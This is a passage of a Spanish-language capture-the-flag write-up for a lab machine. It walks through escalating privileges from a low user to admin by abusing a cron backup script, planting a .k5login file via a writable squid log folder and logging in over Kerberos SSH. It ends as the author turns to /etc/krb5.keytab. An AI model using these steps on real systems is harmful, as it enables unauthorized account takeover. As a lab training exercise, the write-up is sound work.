<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">j.nakazawa@srv01 </span><span style="color:#AB5959;--shiki-dark:#89DDFF">~</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ cat /etc/passwd </span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> grep</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">/bin/.*sh</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">root:x:0:0:root:/root:/bin/bash</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">j.nakazawa:x:1000:1000::/home/j.nakazawa:/bin/bash</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">admin:x:1011:1011::/home/admin:/bin/bash</span></span></code></pre> 
<p>El administrador parece un objetivo interesante… Intentemos encontrar una manera de acceder al administrador.</p>
<p>Al observar los cronjobs, parece que el usuario administrador ejecuta un script cada minuto:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">j.nakazawa@srv01 </span><span style="color:#AB5959;--shiki-dark:#89DDFF">~</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ cat /etc/crontab </span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">SHELL</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B56959;--shiki-dark:#C3E88D">/bin/bash</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">PATH</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B56959;--shiki-dark:#C3E88D">/sbin:/bin:/usr/sbin:/usr/bin</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">MAILTO</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B56959;--shiki-dark:#C3E88D">root</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># Example of job definition:</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># .---------------- minute (0 - 59)</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># |  .------------- hour (0 - 23)</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># |  |  .---------- day of month (1 - 31)</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># |  |  |  |  |</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># *  *  *  *  * user-name  command to be executed</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> *</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> *</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> *</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> *</span><span style="color:#393A34;--shiki-dark:#BABED8"> admin /usr/local/bin/log_backup.sh</span></span></code></pre> 
<p>Echemos un vistazo al script log_backup</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">j.nakazawa@srv01 </span><span style="color:#AB5959;--shiki-dark:#89DDFF">~</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ cat /usr/local/bin/log_backup.sh</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/usr/bin/rsync</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -avz</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --no-perms</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --no-owner</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --no-group</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /var/log/squid/</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /home/admin/</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">cd</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /home/admin</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/usr/bin/tar</span><span style="color:#B56959;--shiki-dark:#C3E88D"> czf</span><span style="color:#B56959;--shiki-dark:#C3E88D"> squid_logs.tar.gz.</span><span style="color:#999999;--shiki-dark:#89DDFF">`</span><span style="color:#59873A;--shiki-dark:#FFCB6B">/usr/bin/date</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +%F-%H%M%S</span><span style="color:#999999;--shiki-dark:#89DDFF">`</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> access.log</span><span style="color:#B56959;--shiki-dark:#C3E88D"> cache.log</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/usr/bin/rm</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -f</span><span style="color:#B56959;--shiki-dark:#C3E88D"> access.log</span><span style="color:#B56959;--shiki-dark:#C3E88D"> cache.log</span></span></code></pre> 
<p>Parece que el usuario administrador copia todo desde la carpeta <code>/var/log/squid</code> a su carpeta de inicio. Luego archiva los dos archivos de registro y los elimina. Como todo se copia, pero solo se eliminan los dos archivos especificados, potencialmente tenemos escritura arbitraria en la carpeta <code>/home/admin</code>.</p>
<p>Confirmemos esto comprobando si tenemos acceso de escritura a la carpeta /var/log/squid.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">j.nakazawa@srv01 </span><span style="color:#AB5959;--shiki-dark:#89DDFF">~</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ ls -alh /var/log/</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">total</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1.4</span><span style="color:#B56959;--shiki-dark:#C3E88D">M</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">drwxr-xr-x.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 12</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root</span><span style="color:#B56959;--shiki-dark:#C3E88D">   root</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   4.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">K</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Feb</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 23</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 19</span><span style="color:#B56959;--shiki-dark:#C3E88D">:52</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">drwxr-xr-x.</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 22</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root</span><span style="color:#B56959;--shiki-dark:#C3E88D">   root</span><span style="color:#2F798A;--shiki-dark:#F78C6C">   4.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">K</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Dec</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 24</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 06</span><span style="color:#B56959;--shiki-dark:#C3E88D">:24</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ..</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">drwx-wx---.</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> admin</span><span style="color:#B56959;--shiki-dark:#C3E88D">  squid</span><span style="color:#2F798A;--shiki-dark:#F78C6C">    41</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Dec</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 24</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 06</span><span style="color:#B56959;--shiki-dark:#C3E88D">:36</span><span style="color:#B56959;--shiki-dark:#C3E88D"> squid</span></span></code></pre> 
<p>Parece que solo el usuario administrador puede leer la carpeta, sin embargo, el grupo squid puede escribir en la carpeta. Revisemos nuestros grupos.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">j.nakazawa@srv01 </span><span style="color:#AB5959;--shiki-dark:#89DDFF">~</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ id</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">uid</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1000</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">j.nakazawa</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#B07D48;--shiki-dark:#BABED8"> gid</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1000</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">j.nakazawa</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#B07D48;--shiki-dark:#BABED8"> groups</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1000</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">j.nakazawa</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#B56959;--shiki-dark:#C3E88D">,23</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">squid</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#B56959;--shiki-dark:#C3E88D">,100</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">users</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span></code></pre> 
<p>Parece que somos parte del grupo de squid, lo que confirma nuestro vector de ataque. La única pregunta que queda es qué queremos escribir en la carpeta. Normalmente, escribiría mi clave ssh en .ssh/authorized_keys. Sin embargo, la autenticación de clave pública está deshabilitada. Mi investigación de Kerberos con SSH reveló que hay una manera de permitir que otros usuarios inicien sesión en su cuenta utilizando un archivo .k5login como se indica en este artículo: <a href="https://www.oreilly.com/library/view/linux-security-cookbook/0596003919/ch04s14.html">https://www.oreilly.com/library/view/linux-security-cookbook/0596003919/ch04s14.html</a></p>
<p>“Si desea permitir que otra persona inicie sesión en su cuenta a través de Kerberos, puede agregar su principal de Kerberos a su archivo ~/.k5login. ¡Asegúrate de agregar también el tuyo propio si creas este archivo, ya que de lo contrario no podrás acceder a tu propia cuenta!
Privesc al administrador: Explotación del script log_backup</p>
<p>tenemos que crear nuestro archivo en <code>/var/log/squid/.k5login</code> y esperar hasta que se copie en la carpeta del administrador. Entonces deberíamos poder utilizar SSH como administrador cuando la tarean cron se ejecute.</p>
<p>Te recomiendo que lo hagas varias veces, ya que a la primera no va:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">j.nakazawa@srv01 log</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ echo </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">j.nakazawa@REALCORP.HTB</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> /var/log/squid/.k5login </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">j.nakazawa@srv01 log</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ echo </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">j.nakazawa@REALCORP.HTB</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> /var/log/squid/.k5login </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">j.nakazawa@srv01 log</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ echo </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">j.nakazawa@REALCORP.HTB</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> /var/log/squid/.k5login </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">j.nakazawa@srv01 log</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ echo </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">j.nakazawa@REALCORP.HTB</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> /var/log/squid/.k5login </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">j.nakazawa@srv01 log</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ echo </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">j.nakazawa@REALCORP.HTB</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> /var/log/squid/.k5login </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">j.nakazawa@srv01 log</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$ echo </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">j.nakazawa@REALCORP.HTB</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> /var/log/squid/.k5login </span></span></code></pre> 
<p>Luego nos conectamos por ssh:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">ssh</span><span style="color:#B56959;--shiki-dark:#C3E88D"> admin@10.10.10.224</span><span style="color:#393A34;--shiki-dark:#BABED8">   </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Activate</span><span style="color:#B56959;--shiki-dark:#C3E88D"> the</span><span style="color:#B56959;--shiki-dark:#C3E88D"> web</span><span style="color:#B56959;--shiki-dark:#C3E88D"> console</span><span style="color:#B56959;--shiki-dark:#C3E88D"> with:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> systemctl</span><span style="color:#B56959;--shiki-dark:#C3E88D"> enable</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --now</span><span style="color:#B56959;--shiki-dark:#C3E88D"> cockpit.socket</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Last</span><span style="color:#B56959;--shiki-dark:#C3E88D"> login:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Thu</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Aug</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  8</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 16</span><span style="color:#B56959;--shiki-dark:#C3E88D">:00:02</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2024</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">admin@srv01 </span><span style="color:#AB5959;--shiki-dark:#89DDFF">~</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">$</span></span></code></pre> 
<p>Obtuvimos con éxito un shell como administrador y ahora podemos continuar nuestra búsqueda de un vector privesc para root.</p>
<p>Ejecutemos un script de enumeración en la máquina, voy a usar LinPeas.sh: <a href="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh">https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh</a></p>
<p>Cuando miramos el resultado del script, nos damos cuenta de dos archivos que pertenecen a la raíz y generalmente no son legibles, pero sí pueden ser leídos por el administrador.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/etc/squid/squid.conf</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/etc/krb5.keytab</span></span></code></pre> 
<p>El Archivo /etc/krb5.keytab solo es legible por root y admin.</p>
<p>Echemos un vistazo mas de cerca al expediente.</p>
